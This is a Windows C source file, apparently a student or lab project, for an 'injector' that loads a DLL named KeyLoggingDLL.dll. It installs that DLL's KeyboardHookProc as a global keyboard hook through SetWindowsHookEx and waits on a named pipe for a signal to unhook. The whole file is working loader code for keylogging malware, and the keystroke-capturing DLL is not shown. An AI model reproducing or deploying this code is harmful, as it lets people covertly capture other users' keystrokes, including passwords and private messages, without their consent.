#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <psapi.h>

#define no_init_all deprecated
#define pipeName _T("\\\\.\\pipe\\pipeToInjector")

void _printf(const char* format, ...)
{
	char msg[100];
	wchar_t	wmsg[101];
	va_list args;
	va_start(args, format);
	vsnprintf(msg, sizeof(msg), format, args); // do check return value
	va_end(args);
	size_t outsize;
	size_t size = strlen(msg) + 1;
	mbstowcs_s(&outsize, wmsg, size, msg, size - 1);
	OutputDebugString(wmsg);
}

int main()
{
	_printf("In injector\n");
	
	HMODULE dll;
	HHOOK hook;
	HOOKPROC hookproc;
	char buffer[1024];
	DWORD dwRead;
	
	HANDLE hPipe = CreateFile(pipeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	const wchar_t* dll_path = L"C:\\Users\\ISE\\source\\repos\\KeyLoggingDLL\\x64\\Debug\\KeyLoggingDLL.dll";
	dll = LoadLibraryEx(dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);

	if (dll)
	{
		hookproc = (HOOKPROC)GetProcAddress(dll, "KeyboardHookProc");
		
		if (hookproc)
		{
			hook = SetWindowsHookEx(WH_KEYBOARD, hookproc, dll, 0);
			if (hook)
			{
				// block until the service send message to unhook
				while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &dwRead, NULL) && dwRead != 0)
				{
					buffer[dwRead] = '\0';
					UnhookWindowsHookEx(hook);
					CloseHandle(hPipe);
				}
			}
			else
			{
				_printf("Set Windows Hook failed\n");
			}
		}
		else
		{
			_printf("Get Proc address failed\n");
		}
	}
	else
	{
		_printf("Load dll failed\n");
	}
	return 0;
}